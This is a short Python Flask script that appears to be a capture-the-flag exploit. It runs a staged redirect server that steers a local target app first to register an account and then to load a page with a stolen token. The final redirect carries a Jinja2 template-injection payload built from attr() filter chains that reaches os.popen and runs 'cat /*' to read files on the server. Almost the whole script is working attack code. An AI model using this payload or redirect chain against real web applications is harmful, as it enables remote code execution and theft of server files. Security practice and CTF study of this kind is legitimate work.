from flask import Flask, Response, request, redirect
import urllib.parse

app = Flask(__name__)
stage = {"count": 0}
username = "boom"
password = "boom"

@app.route('/', defaults={'path': ''}, methods=['GET', 'HEAD'])
@app.route('/<path:path>', methods=['GET', 'HEAD'])
def catch(path):
    if request.method == 'HEAD':
        stage["count"] += 1
        print(f"\n[+] HEAD received. Moving to stage {stage['count']}")
       
        resp = Response("", status=200)
        resp.headers['Content-Type'] = 'text/x-component'
        return resp

    print(f"\n[+] GET received. Stage {stage['count']}")
    
    if stage["count"] == 1:
        print("[*] Redirecting to /register")
        return redirect(f"http://127.0.0.1:3000/register?username={username}&password={password}")

    elif stage["count"] == 2:
        print("[*] Redirecting to /home with token")
        with open("token", "r") as token_file:
            token = token_file.read()
            print(f"We loaded the following token: {token}")
            payload = "{% print(request|attr('application')|attr(request|attr('args')|attr('get')('a'))|attr(request|attr('args')|attr('get')('d'))(request|attr('args')|attr('get')('b'))|attr(request|attr('args')|attr('get')('d'))(request|attr('args')|attr('get')('c'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()) %}"
            return redirect(f"http://127.0.0.1:3000/home?token={token}&directory={payload}&a=__globals__&b=__builtins__&c=__import__&d=__getitem__&cmd=cat /*")

    return Response("Stage overflow or no action", status=500)
